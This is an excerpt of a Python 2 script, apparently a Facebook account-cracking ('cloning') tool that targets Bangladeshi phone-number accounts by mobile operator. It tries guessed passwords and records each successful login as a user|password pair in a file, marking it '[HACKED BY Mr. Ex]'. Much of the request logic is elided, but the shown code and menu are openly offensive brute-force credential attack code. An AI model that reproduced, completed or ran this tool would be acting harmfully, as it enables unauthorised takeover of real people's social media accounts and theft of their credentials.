...
print("\033[0;91mThis Tool's Make By Mr. Ex")

psb('\x1b[1;92mBANGLADESH 11 DIGIT CLONING START PLEASE WAIT .....')
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   :MR.Ex'
    print '\033[0;94mFACEBOOK : Mr. Ex'
    print '\033[0;96mGITHUB   : Mr3x1'
    print ''
    print '\033[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
    print '\033[0;93m'
    print 50* '-'
    print '\033[0;92m[1]  \x1b[1;93mGrameenPhone'
    print '\033[0;93m[2]  \x1b[1;94mRobi'
    print '\033[0;94m[3]  \x1b[1;95mAirtel'
    print '\033[0;95m[4]  \x1b[1;96mBanglalink'
    print '\033[0;96m[5]  \x1b[1;97mTeletalk'
    print '\033[0;90m[0]  \x1b[1;91mExit            '
    print '\033[0;92m'
    print 50 * '-'
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED BY Mr. Ex]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Fucked BY Mr. Ex]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
